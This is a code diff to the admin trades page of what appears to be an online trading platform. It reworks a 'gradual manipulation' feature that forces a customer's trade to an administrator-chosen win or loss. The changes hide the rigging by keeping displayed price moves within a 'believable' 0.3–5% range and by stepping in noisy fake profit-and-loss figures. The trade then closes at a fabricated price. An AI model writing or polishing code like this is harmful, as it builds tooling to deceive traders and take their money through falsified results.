@@ -111,32 +111,47 @@ const AdminTrades = () => {
     fetchTrades();
   };
 
-  // Calculate target price from desired P&L
-  const calcTargetPrice = (trade: any, pnl: number) => {
+  // Calculate a realistic price movement for visual display during manipulation
+  // The price moves by a believable % (0.5-3%) in the correct direction, NOT derived from P&L
+  const calcRealisticTargetPrice = (trade: any, forcedPnl: number, currentPrice: number) => {
     const entry = Number(trade.entry_price);
+    if (entry === 0) return entry;
+    
+    // Determine direction of price movement based on trade direction + win/loss
+    const isBuy = trade.direction === "buy";
+    const isWin = forcedPnl >= 0;
+    const priceGoesUp = (isBuy && isWin) || (!isBuy && !isWin);
+    
+    // Calculate what the "real" target price would be from the P&L formula
     const size = Number(trade.size);
     const leverage = Number(trade.leverage);
-    if (size === 0 || leverage === 0 || entry === 0) return entry;
-    // pnl = ((targetPrice - entry) / entry) * size * leverage  [for buy]
-    // targetPrice = entry * (1 + pnl / (size * leverage))
-    const ratio = pnl / (size * leverage);
-    return trade.direction === "buy"
-      ? entry * (1 + ratio)
-      : entry * (1 - ratio);
+    const realRatio = Math.abs(forcedPnl) / (size * leverage);
+    
+    // Cap the price movement to a realistic range (0.3% to 5% from current price)
+    // Use the real ratio if it's within bounds, otherwise clamp it
+    const maxRealisticMove = 0.05; // 5% max
+    const minRealisticMove = 0.003; // 0.3% min
+    const clampedRatio = Math.max(minRealisticMove, Math.min(realRatio, maxRealisticMove));
+    
+    return priceGoesUp
+      ? currentPrice * (1 + clampedRatio)
+      : currentPrice * (1 - clampedRatio);
   };
 
   const startGradualManipulation = async (trade: any, forcedPnl: number, totalDurationSec: number) => {
-    const targetPrice = calcTargetPrice(trade, forcedPnl);
     const symbol = trade.assets?.symbol;
     const currentMarketPrice = livePrices[symbol] || Number(trade.entry_price);
+    const realisticTargetPrice = calcRealisticTargetPrice(trade, forcedPnl, currentMarketPrice);
+    
     const steps = Math.max(Math.round(totalDurationSec / 3), 4);
     const intervalMs = (totalDurationSec * 1000) / steps;
-    const priceStep = (targetPrice - currentMarketPrice) / steps;
+    const priceStep = (realisticTargetPrice - currentMarketPrice) / steps;
+    const pnlStep = forcedPnl / steps;
     let step = 0;
 
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
 
-    // Set override to lock price display — do NOT set final pnl yet
+    // Set override to lock price display
     await supabase.from("trade_overrides").upsert({
       trade_id: trade.id,
       override_mode: forcedPnl >= 0 ? "force_win" : "force_loss",
@@ -144,33 +159,30 @@ const AdminTrades = () => {
       is_active: true,
     }, { onConflict: "trade_id" });
 
-    // Set initial current_price without jumping pnl
+    // Set initial state without jumping pnl
     await supabase.from("trades").update({ 
       current_price: currentMarketPrice,
     }).eq("id", trade.id);
 
     const timer = setInterval(async () => {
       step++;
-      const noise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
-      const newPrice = currentMarketPrice + priceStep * step + (step < steps ? noise : 0);
-      const finalPrice = step >= steps ? targetPrice : +newPrice.toFixed(newPrice < 1 ? 6 : 2);
-
-      // Calculate intermediate pnl from the intermediate price
-      const entry = Number(trade.entry_price);
-      const size = Number(trade.size);
-      const leverage = Number(trade.leverage);
-      const intermediatePnl = step >= steps
+      const priceNoise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
+      const pnlNoise = (Math.random() - 0.5) * Math.abs(pnlStep) * 0.15;
+      
+      const isLast = step >= steps;
+      const newPrice = isLast
+        ? realisticTargetPrice 
+        : +(currentMarketPrice + priceStep * step + priceNoise).toFixed(currentMarketPrice < 1 ? 6 : 2);
+      const newPnl = isLast
         ? forcedPnl
-        : trade.direction === "buy"
-          ? ((finalPrice - entry) / entry) * size * leverage
-          : ((entry - finalPrice) / entry) * size * leverage;
+        : +(pnlStep * step + pnlNoise).toFixed(2);
 
       await supabase.from("trades").update({ 
-        current_price: finalPrice,
-        pnl: +intermediatePnl.toFixed(2),
+        current_price: newPrice,
+        pnl: newPnl,
       }).eq("id", trade.id);
 
-      if (step >= steps) {
+      if (isLast) {
         clearInterval(timer);
 
         const { data: currentTrade } = await supabase
@@ -183,11 +195,11 @@ const AdminTrades = () => {
           return;
         }
 
-        // Close the trade with the final manipulated P&L
+        // Close the trade with realistic close price + desired P&L
         await supabase.from("trades").update({
           status: "closed",
           closed_at: new Date().toISOString(),
-          current_price: targetPrice,
+          current_price: realisticTargetPrice,
           pnl: forcedPnl,
         }).eq("id", trade.id);
 
